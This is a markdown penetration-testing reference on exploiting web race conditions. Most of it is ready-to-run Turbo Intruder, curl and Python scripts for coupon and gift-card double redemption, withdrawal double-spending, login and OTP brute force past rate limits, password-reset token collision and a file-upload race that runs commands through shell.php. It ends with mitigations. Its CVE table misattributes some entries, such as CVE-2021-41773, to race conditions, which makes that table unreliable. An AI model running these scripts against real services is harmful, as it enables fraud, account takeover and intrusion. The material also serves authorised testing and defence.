# ⚡ Race Condition

> A complete reference for detecting and exploiting race condition vulnerabilities in web applications. Covers TOCTOU, limit overrun, single-packet attack, multi-endpoint races, hidden state machines, connection warming, Burp Suite, Turbo Intruder, Python scripts, and real-world attack scenarios.

---

## Table of Contents

- [Overview](#overview)
- [Race Condition Types](#race-condition-types)
- [How Race Windows Work](#how-race-windows-work)
- [Technique 1 — Single-Packet Attack (HTTP/2)](#technique-1--single-packet-attack-http2)
- [Technique 2 — Last-Byte Sync (HTTP/1.1)](#technique-2--last-byte-sync-http11)
- [Technique 3 — Connection Warming](#technique-3--connection-warming)
- [Burp Suite Repeater — Send Group in Parallel](#burp-suite-repeater--send-group-in-parallel)
- [Turbo Intruder — HTTP/2 Single-Packet Attack](#turbo-intruder--http2-single-packet-attack)
- [Turbo Intruder — Multi-Endpoint Race](#turbo-intruder--multi-endpoint-race)
- [Python — Concurrent Requests](#python--concurrent-requests)
- [Attack 1 — Limit Overrun](#attack-1--limit-overrun)
- [Attack 2 — Rate Limit Bypass (Brute Force)](#attack-2--rate-limit-bypass-brute-force)
- [Attack 3 — Gift Card / Coupon Double Redemption](#attack-3--gift-card--coupon-double-redemption)
- [Attack 4 — Double Spending (Payment)](#attack-4--double-spending-payment)
- [Attack 5 — Registration Race (Duplicate Account)](#attack-5--registration-race-duplicate-account)
- [Attack 6 — Privilege Escalation via Hidden State](#attack-6--privilege-escalation-via-hidden-state)
- [Attack 7 — Password Reset Token Collision](#attack-7--password-reset-token-collision)
- [Attack 8 — File Upload Race](#attack-8--file-upload-race)
- [Attack 9 — 2FA / OTP Bypass via Race](#attack-9--2fa--otp-bypass-via-race)
- [Attack 10 — Session / Cookie Race](#attack-10--session--cookie-race)
- [Hidden State Machine Discovery](#hidden-state-machine-discovery)
- [Handling Server-Side Delays](#handling-server-side-delays)
- [WebSocket Race Conditions](#websocket-race-conditions)
- [h2spacex — Low-Level HTTP/2 Tool](#h2spacex--low-level-http2-tool)
- [Raceocat — Automation Tool](#raceocat--automation-tool)
- [Real-World CVEs](#real-world-cves)
- [Complete Testing Checklist](#complete-testing-checklist)
- [Mitigations](#mitigations)
- [References](#references)

---

## Overview

A **race condition** occurs when a system's behavior depends on the timing of uncontrollable events (usually concurrent requests). Web race conditions exploit the gap between a **check** and the corresponding **action** — a window where shared state can be manipulated.

### Why Race Conditions Are Underreported

- Race window can be **microseconds to milliseconds** — hard to hit manually
- Many developers assume server-side logic is atomic
- Traditional scanners miss them
- HTTP/1.1 network jitter made exploitation unreliable — **HTTP/2 single-packet attack** changed this (Black Hat USA 2023)

---

## Race Condition Types

| Type | Description | Example |
|---|---|---|
| **Limit Overrun** | Exceed a per-user/per-session limit | Apply coupon 20× simultaneously |
| **TOCTOU** | State changes between check and action | Gift card: checked unused → credited 20× |
| **Multi-Endpoint** | Different endpoints share state | Register + use invite code simultaneously |
| **Hidden State Machine** | Exploit transient intermediate state | Role selection bypass during account setup |
| **Single-Endpoint Collision** | Same endpoint, different values | Password reset: two tokens generated, one overwritten |
| **File Race** | File written then moved/deleted | Upload bypass via AV scan race |

---

## How Race Windows Work

```
Normal (sequential):
  Request 1 → [CHECK] → [ACTION] → done
  Request 2 →                       [CHECK] → [ACTION] → done

Race condition (concurrent):
  Request 1 → [CHECK] ─────────────────────────────── [ACTION]
  Request 2 →           [CHECK] ────────── [ACTION]
                              ↑ both CHECK at same time
                              ↑ both see state as VALID
                              ↑ both ACTION → double execution
```

### Classic TOCTOU — Gift Card

```
Thread 1: SELECT balance WHERE card='ABC' → 100  ← CHECK (both see 100)
Thread 2: SELECT balance WHERE card='ABC' → 100  ← CHECK (both see 100)
Thread 1: UPDATE balance SET balance=0 WHERE card='ABC'  ← ACTION
Thread 2: UPDATE balance SET balance=0 WHERE card='ABC'  ← ACTION (too late — already zero)
          BUT: credit was already applied to BOTH accounts
```

---

## Technique 1 — Single-Packet Attack (HTTP/2)

> Introduced at **Black Hat USA 2023** by James Kettle (PortSwigger). Sends **20–30 requests** in a **single TCP packet** using HTTP/2 multiplexing, eliminating network jitter and shrinking the timing window to sub-1ms.

### How It Works

```
HTTP/2 Multiplexing:
  Multiple streams share one TCP connection
  Each stream = one HTTP request
  All streams sent in ONE packet → server processes them simultaneously
  Race window: sub-1ms (vs ~50-200ms for HTTP/1.1)

HTTP/1.1 Last-Byte Sync:
  Hold the final byte of each request
  Release all final bytes simultaneously
  Less precise than HTTP/2 single-packet
```

### Requirements

- Target supports **HTTP/2** (check in Burp → HTTP/2 indicator)
- Burp Suite Pro with Turbo Intruder extension
- OR custom HTTP/2 client (h2spacex, Golang)

---

## Technique 2 — Last-Byte Sync (HTTP/1.1)

> For targets that only support HTTP/1.1. Hold back the last byte (`\r\n\r\n`) of each request body, then release all simultaneously.

### With Burp Repeater

```
1. Create a Tab Group in Burp Repeater
2. Add 20 identical requests to the group
3. Click dropdown next to Send → "Send group in parallel"
4. Burp synchronizes last-byte release
```

### With curl (basic)

```bash
# Not precise — use Burp or Turbo Intruder for real attacks
# This is only illustrative
for i in $(seq 1 20); do
  curl -s -X POST https://target.com/redeem \
    -d "code=PROMO50" \
    -b "session=YOUR_SESSION" &
done
wait
```

---

## Technique 3 — Connection Warming

> Front-end servers often create **fresh TCP connections** for the first request, causing the first request to be slower. Connection warming pre-establishes the connection so all attack requests travel on a warm (fast) path.

### Burp Repeater — Connection Warming

```
1. In your Tab Group, add a GET / request as the FIRST tab
2. Use "Send group in sequence (single connection)"
3. First request warms the connection
4. All subsequent requests use the warm connection → consistent timing
5. Switch to "Send group in parallel" for the actual attack
```

### Turbo Intruder — Connection Warming

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    # Warm the connection
    engine.queue(target.req, gate=None)  # Non-gated = sends immediately

    # Queue attack requests (held until gate opens)
    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')  # Release all 20 simultaneously
```

### When Connection Warming Doesn't Help

If you still see inconsistent timing after warming:
1. **Server-side delay** — use rate limit trick (see [Handling Server-Side Delays](#handling-server-side-delays))
2. **Back-end has locking** — try multi-endpoint attack instead
3. **HTTP/1.1 only** — last-byte sync is less reliable; increase request count

---

## Burp Suite Repeater — Send Group in Parallel

### Setup

```
1. Open Burp Suite → Proxy → Intercept a target request
2. Right-click → Send to Repeater (Ctrl+R) × 20 times
3. In Repeater — click "+" tab → Create new group
4. Name the group "Race Test"
5. Drag all 20 tabs into the group
6. Click Send dropdown → "Send group in parallel"
```

### HTTP/2 Detection

```
Burp Repeater → look for "HTTP/2" label in the request panel
If HTTP/2 → single-packet attack is used automatically
If HTTP/1.1 → last-byte sync is used automatically
```

---

## Turbo Intruder — HTTP/2 Single-Packet Attack

### Single Endpoint (same request 20×)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2      # HTTP/2 single-packet
    )

    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Single Endpoint — Different Values (e.g. coupon codes)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    # Values from clipboard (copy a list first)
    codes = wordlists.clipboard
    for code in codes:
        engine.queue(target.req, code, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

> In the request: replace the value you want to fuzz with `%s`
> Example: `code=%s`

### Brute Force with Rate Limit Bypass (HTTP/2)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    passwords = [
        "123456", "password", "admin", "letmein", "qwerty",
        "monkey", "dragon", "master", "abc123", "111111"
    ]

    for password in passwords:
        engine.queue(target.req, password, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    if '200' in req.status or 'success' in req.response:
        table.add(req)
```

### Fallback — HTTP/1.1 Threaded Engine

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,   # Multiple parallel connections
        requestsPerConnection=1,
        pipeline=False,
        engine=Engine.THREADED      # HTTP/1.1 fallback
    )

    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

---

## Turbo Intruder — Multi-Endpoint Race

> Used when the race requires **two different endpoints** to interact — e.g. send a request that sets a hidden state, then immediately exploit that state with multiple parallel requests.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    # Step 1: Request that triggers hidden state (e.g. role selection skip)
    # This is Request A — triggers the transient state
    engine.queue(target.req, gate='race1')         # Request A (1×)

    # Step 2: 50 requests that exploit the hidden state
    # Replace with your second endpoint request
    for i in range(50):
        engine.queue(target.req2, gate='race1')    # Request B (50×)

    engine.openGate('race1')  # Fire A + all 50 B simultaneously

def handleResponse(req, interesting):
    table.add(req)
```

> **Note:** `target.req2` — paste your second request in the Turbo Intruder template

---

## Python — Concurrent Requests

### threading (basic)

```python
import requests
import threading

SESSION_COOKIE = "your_session_cookie"
TARGET_URL = "https://target.com/redeem"

results = []
lock = threading.Lock()

def send_request(idx):
    r = requests.post(TARGET_URL,
        data={"code": "PROMO50"},
        cookies={"session": SESSION_COOKIE}
    )
    with lock:
        results.append((idx, r.status_code, r.text[:100]))
        print(f"[{idx}] {r.status_code} → {r.text[:80]}")

threads = [threading.Thread(target=send_request, args=(i,)) for i in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

### asyncio + httpx (precise, HTTP/2 support)

```python
import asyncio
import httpx

SESSION = "your_session_cookie"
URL = "https://target.com/redeem"

async def send_request(client, idx):
    r = await client.post(URL,
        data={"code": "PROMO50"},
        cookies={"session": SESSION}
    )
    print(f"[{idx}] {r.status_code} → {r.text[:80]}")
    return r

async def race(n=20):
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        # Warm connection
        await client.get("https://target.com/")

        # Fire all requests simultaneously
        tasks = [send_request(client, i) for i in range(n)]
        results = await asyncio.gather(*tasks)

asyncio.run(race(20))
```

### requests-futures (simple parallel)

```python
from requests_futures.sessions import FuturesSession

session = FuturesSession(max_workers=20)
session.cookies.set("session", "YOUR_SESSION")

futures = [
    session.post("https://target.com/redeem", data={"code": "PROMO50"})
    for _ in range(20)
]

for i, f in enumerate(futures):
    r = f.result()
    print(f"[{i}] {r.status_code} → {r.text[:80]}")
```

---

## Attack 1 — Limit Overrun

> The most common race condition. Exceed a per-user limit (1 coupon, 1 vote, 1 redemption) by sending multiple simultaneous requests before the server can update the counter.

### Target Indicators

```
- "This code has already been used"
- "You've already voted"
- "One redemption per account"
- "Daily limit reached"
- "Insufficient balance" (after one withdrawal)
```

### Exploitation Steps

```
1. Find the limited endpoint: POST /redeem, POST /vote, POST /withdraw
2. Test it works once manually
3. Reset state (new account, new code, or new session)
4. Send 20 identical requests simultaneously via Burp group / Turbo Intruder
5. Check results — if multiple succeed → limit overrun confirmed
```

### Example — Promo Code

```
Normal flow:
  POST /redeem { "code": "SAVE50" } → 200 Discount applied
  POST /redeem { "code": "SAVE50" } → 400 Code already used

Race condition:
  20× POST /redeem { "code": "SAVE50" } simultaneously
  → Multiple 200 responses → discount applied multiple times
```

---

## Attack 2 — Rate Limit Bypass (Brute Force)

> Rate limits (max 5 login attempts) are enforced by checking a counter BEFORE incrementing it. Concurrent requests all read the counter as 0 simultaneously, all pass the check, and all attempt authentication.

### Login Brute Force via Race

```python
# Turbo Intruder — brute force login bypassing rate limit
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    passwords = wordlists.clipboard  # Paste password list to clipboard
    for password in passwords:
        engine.queue(target.req, password, gate='race1')

    engine.openGate('race1')

# Request template in Turbo Intruder:
# POST /login
# username=admin&password=%s
```

### OTP Brute Force via Race

```python
# 6-digit OTP: 1,000,000 combinations
# Rate limit: 5 attempts before lockout
# Race bypass: send all attempts before counter updates

for otp in range(1000000):
    code = str(otp).zfill(6)
    engine.queue(target.req, code, gate='race1')
# Release in batches of 20–30 per gate
```

---

## Attack 3 — Gift Card / Coupon Double Redemption

```
State machine (vulnerable):
  [UNUSED] → CHECK → [APPLY DISCOUNT] → [MARK USED]
                ↑
         Race window here — both threads see UNUSED

Exploit:
  1. Get a valid gift card / coupon code
  2. Queue 20× POST /apply-coupon { "code": "GIFT100" }
  3. Send all simultaneously
  4. Multiple succeed → balance credited multiple times

Impact: Full account credit / free purchases
```

### Burp Repeater Steps

```
1. Intercept POST /apply-coupon
2. Send to Repeater → Ctrl+R × 20
3. Group all tabs → "Send group in parallel"
4. Check responses — count how many return 200
5. Verify account balance → multiple credits
```

---

## Attack 4 — Double Spending (Payment)

```
Scenario: Wallet with $10
  Thread 1: SELECT balance → $10  (check)
  Thread 2: SELECT balance → $10  (check — same time)
  Thread 1: Withdraw $10 → balance = $0
  Thread 2: Withdraw $10 → balance = -$10 (RACE — already 0!)

Attack:
  1. Account balance: $10
  2. Queue 2× POST /withdraw { "amount": 10 }
  3. Send simultaneously
  4. Both may succeed → withdrew $20 from $10 account
```

---

## Attack 5 — Registration Race (Duplicate Account)

```
Scenario: Invite-only registration (1 invite = 1 account)
  Check: Has invite been used? → NO
  Action: Create account + mark invite used

Race:
  20× POST /register { "invite": "ABC123", "username": "user_N" }
  All 20 check simultaneously → all see invite as unused
  Multiple accounts created with one invite

Impact: Bypass invite limits, referral bonus abuse, free tier abuse
```

---

## Attack 6 — Privilege Escalation via Hidden State

> Some applications have **transient states** during multi-step flows where a user briefly has elevated access. By sending requests during this window, you can exploit the elevated state.

### Scenario — Role Selection Bypass

```
Normal flow:
  1. POST /start-setup   → user enters "setup" state
  2. GET  /select-role   → user picks role (admin/user)
  3. POST /confirm-role  → role assigned, setup complete

Hidden state: Between step 1 and step 3, the user is in "setup" state
              During this window, access to admin endpoints may be unguarded

Attack:
  1. POST /start-setup  (enters setup state)
  2. Immediately: 50× GET /admin/dashboard (exploits setup state)
  3. If any of the 50 return admin content → privilege escalation
```

### Turbo Intruder — Hidden State Attack

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    # Trigger the hidden state (1 request)
    engine.queue(target.req, gate='race1')        # POST /start-setup

    # Exploit the hidden state (50 requests)
    for i in range(50):
        engine.queue(target.req2, gate='race1')   # GET /admin/dashboard

    engine.openGate('race1')
```

---

## Attack 7 — Password Reset Token Collision

> Some applications store a reset token in the user's session. If two reset requests are sent simultaneously, the second token may overwrite the first — but the first confirmation email contains the now-invalid token.

### Scenario

```
Thread 1: POST /reset { "email": "victim@corp.com" }
Thread 2: POST /reset { "email": "attacker@corp.com" }

Race:
  Both requests processed simultaneously
  Server generates token for victim → stores in session
  Server generates token for attacker → overwrites session
  Email to victim contains old token → invalid
  Email to attacker contains token that applies to VICTIM's account

Result: Attacker resets victim's password
```

### Steps

```
1. Session A (attacker): queue POST /reset { email: victim@target.com }
2. Session A (attacker): queue POST /reset { email: attacker@target.com }
3. Send simultaneously
4. Attacker receives reset link → use it to reset victim's password
```

---

## Attack 8 — File Upload Race

> Applications that upload a file, perform security scanning (AV/validation), then move or delete it. A race between the upload and the scan allows a malicious file to be executed before deletion.

```
Normal flow:
  UPLOAD → [AV SCAN] → [DELETE if malicious] → [MOVE if clean]
                 ↑
          Race window: file exists but scan not yet complete

Attack:
  1. Upload malicious file (e.g. shell.php)
  2. Immediately: rapidly poll/access the file path
     GET /uploads/shell.php?cmd=id (many times in parallel)
  3. If any request hits before AV deletes → RCE

Python:
```

```python
import requests, threading

session = "YOUR_SESSION"

def upload():
    with open("shell.php", "rb") as f:
        requests.post("https://target.com/upload",
            files={"file": ("shell.php", f, "image/jpeg")},
            cookies={"session": session})

def access():
    for _ in range(100):
        r = requests.get("https://target.com/uploads/shell.php?cmd=id",
            cookies={"session": session})
        if "uid=" in r.text:
            print(f"[+] RCE: {r.text}")
            break

t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start(); t2.start()
t1.join(); t2.join()
```

---

## Attack 9 — 2FA / OTP Bypass via Race

```
Rate limit: 5 OTP attempts before lockout

Race bypass:
  20× POST /verify-otp { "otp": "123456" } simultaneously
  All 20 check counter simultaneously → all see counter < 5
  All proceed to OTP check → effectively unlimited attempts

Combined with brute force:
  1. Solve CAPTCHA once / get valid session
  2. Queue 20 different OTP values simultaneously
  3. One may match before counter increments
```

See also: [2FA Bypass README](../2FA%20Bypass/README.md)

---

## Attack 10 — Session / Cookie Race

```
Scenario: Session token generated before account verification complete
  POST /register → session created → email verification pending
  Race: immediately use session before verification check propagates

Attack:
  1. POST /register (get session token)
  2. Simultaneously: access /dashboard with that session
  3. If access granted before verification → bypass email verification
```

---

## Hidden State Machine Discovery

> Strategy for finding unknown race condition opportunities (James Kettle — Black Hat 2023).

### Step 1 — Identify High-Value Endpoints

```
Focus on endpoints that:
  - Handle single-use tokens (reset, invite, gift card)
  - Enforce per-user limits (votes, coupons, withdrawals)
  - Change user state (role, tier, subscription)
  - Involve payments or credits
  - Have multi-step flows (setup wizard, checkout)
```

### Step 2 — Benchmark Normal Behavior

```
1. Send your target requests normally (sequential)
2. Record response times, status codes, response lengths
3. This is your baseline
```

### Step 3 — Chaos Probe

```
1. Create a blend of requests targeting all relevant endpoints
2. Send them ALL simultaneously (20-30 per gate)
3. Look for anomalies vs baseline:
   - Unexpected 200s where 400 is normal
   - Different response lengths
   - Different response content
   - Error messages revealing internal state
   - Timing differences
```

### Step 4 — Analyze & Exploit

```
If anomaly found:
  - Identify which request combination triggered it
  - Narrow down to the two key requests
  - Build targeted exploit (1× state trigger + 50× state exploit)
```

---

## Handling Server-Side Delays

> Some endpoints have intentional or unintentional delays that interfere with the race window.

### Problem: Inconsistent Timing

```
Symptom: Responses arrive spread over 500ms even with single-packet attack
Cause:   Back-end processing delay, database lock, middleware queuing
```

### Solution 1 — Rate Limit Trick

```
Intentionally trigger the server's rate/resource limit with dummy requests.
This creates a server-side queue → your attack requests are processed
as a batch when the server recovers → natural synchronization.

Steps:
  1. Send 100 dummy requests rapidly to exhaust rate limit
  2. Immediately queue your attack requests
  3. Server processes the attack batch together once resources free up
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    # Flood with dummy requests to induce server-side delay
    for i in range(100):
        engine.queue(target.req, 'dummy', gate=None)  # No gate = immediate

    # Queue actual attack
    for i in range(20):
        engine.queue(target.req, 'actual_value', gate='race1')

    engine.openGate('race1')
```

### Solution 2 — Client-Side Delay (Turbo Intruder)

```python
# Add a fixed delay between two sub-requests in a multi-step race
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    engine.queue(target.req, gate='step1')
    engine.openGate('step1')

    time.sleep(0.15)  # 150ms delay between steps

    for i in range(20):
        engine.queue(target.req2, gate='step2')
    engine.openGate('step2')
```

> **Note:** Client-side delay requires multiple TCP packets → less precise. Use only when server-side delay trick fails.

---

## WebSocket Race Conditions

> Race conditions can also occur over WebSocket connections.

```python
# Turbo Intruder WebSocket race (THREADED engine)
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,    # Multiple WS connections
        engine=Engine.THREADED
    )

    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

---

## h2spacex — Low-Level HTTP/2 Tool

> Low-level HTTP/2 single-packet attack library based on Scapy for precise timing control.

```bash
# Install
pip install h2spacex

# Basic usage
python3 -c "
from h2spacex import H2OnTlsConnection
conn = H2OnTlsConnection(hostname='target.com', port_number=443)
conn.setup_connection()
# Send multiple streams in one packet
"
```

```bash
# GitHub: https://github.com/nxenon/h2spacex
# Use when Burp/Turbo Intruder isn't available
```

---

## Raceocat — Automation Tool

```bash
# Install
git clone https://github.com/JavanXD/Raceocat
cd Raceocat
pip install -r requirements.txt

# Run race condition test
python raceocat.py \
  --url "https://target.com/redeem" \
  --method POST \
  --data "code=PROMO50" \
  --cookie "session=YOUR_SESSION" \
  --threads 20 \
  --gate

# GitHub: https://github.com/JavanXD/Raceocat
```

---

## Real-World CVEs

| CVE | Product | Description | Impact |
|---|---|---|---|
| **CVE-2022-4037** | GitLab CE/EE | Race condition → verified email forgery + OAuth account takeover | Critical |
| **CVE-2024-58248** | nopCommerce < 4.80.0 | No locking on order placement → gift card double redemption | High |
| **CVE-2022-21703** | Grafana | Race condition in snapshot creation → privilege escalation | High |
| **CVE-2021-41773** | Apache HTTP Server | Path traversal race condition (RCE on affected configs) | Critical |
| **CVE-2019-5736** | runc | File descriptor race → container escape to host RCE | Critical |

---

## Complete Testing Checklist

### Discovery
- [ ] Identified single-use endpoints (coupon, gift card, invite, vote)
- [ ] Identified rate-limited endpoints (login, OTP, API calls)
- [ ] Identified state-changing endpoints (role, subscription, checkout)
- [ ] Identified multi-step flows (registration, password reset, checkout)
- [ ] Target supports HTTP/2? (single-packet attack viable)

### Limit Overrun
- [ ] Coupon / promo code applied multiple times?
- [ ] Gift card redeemed multiple times?
- [ ] Vote cast multiple times?
- [ ] Referral bonus claimed multiple times?
- [ ] Free trial activated multiple times?

### Rate Limit Bypass
- [ ] Login brute force rate limit bypassable?
- [ ] OTP brute force rate limit bypassable?
- [ ] API rate limit bypassable?
- [ ] CAPTCHA rate limit bypassable?

### State Machine
- [ ] Password reset: simultaneous resets produce exploitable collision?
- [ ] Registration: invite code usable multiple times simultaneously?
- [ ] Role/privilege: hidden transient state exploitable?
- [ ] Checkout: payment charged once but order fulfilled multiple times?

### Connection Warming
- [ ] Connection warming applied for front-end routing consistency?
- [ ] Server-side delay handled (rate limit trick or client delay)?

### Tools Used
- [ ] Burp Repeater "Send group in parallel" tested?
- [ ] Turbo Intruder single-packet-attack.py used?
- [ ] Python asyncio+httpx (HTTP/2) used?
- [ ] Results analyzed for status code / response length anomalies?

---

## Mitigations

### Use Atomic Operations / Database Locking

```sql
-- BAD: check then update (race window)
SELECT balance FROM accounts WHERE id=1;
-- (race window here)
UPDATE accounts SET balance = balance - 100 WHERE id=1;

-- GOOD: atomic conditional update
UPDATE accounts
SET balance = balance - 100
WHERE id = 1 AND balance >= 100;
-- Rows affected = 0 → reject; = 1 → success
```

### Pessimistic Locking

```sql
-- Lock the row for the duration of the transaction
BEGIN;
SELECT balance FROM accounts WHERE id=1 FOR UPDATE;  -- Row locked
-- (no race window — other threads block here)
UPDATE accounts SET balance = balance - 100 WHERE id=1;
COMMIT;
```

### Idempotency Keys

```
POST /redeem
{
  "code": "PROMO50",
  "idempotency_key": "unique-uuid-per-request"
}
-- Server rejects duplicate idempotency keys → prevents double processing
```

### Token Invalidation

```
-- Invalidate tokens atomically BEFORE processing
UPDATE tokens SET used=1 WHERE token='ABC' AND used=0;
-- If rows_affected = 0 → already used → reject
-- If rows_affected = 1 → first use → proceed
```

### Rate Limiting at Infrastructure Level

```
-- Per-user rate limit with Redis (atomic)
MULTI
INCR user:123:attempts
EXPIRE user:123:attempts 60
EXEC
-- Atomic increment → no race on the counter itself
```

---

## References

- PortSwigger Research — "Smashing the state machine: the true potential of web race conditions" (James Kettle, Black Hat USA 2023)
- PortSwigger Web Security Academy — Race Conditions
- HackTricks — Race Condition
- PayloadsAllTheThings — Race Condition
- YesWeHack — Ultimate guide to race condition vulnerabilities (2025)
- GMO Flatt Security — "Beyond the Limit: Expanding single-packet race condition" (2024)
- GitHub: PortSwigger/turbo-intruder
- GitHub: nxenon/h2spacex
- GitHub: JavanXD/Raceocat
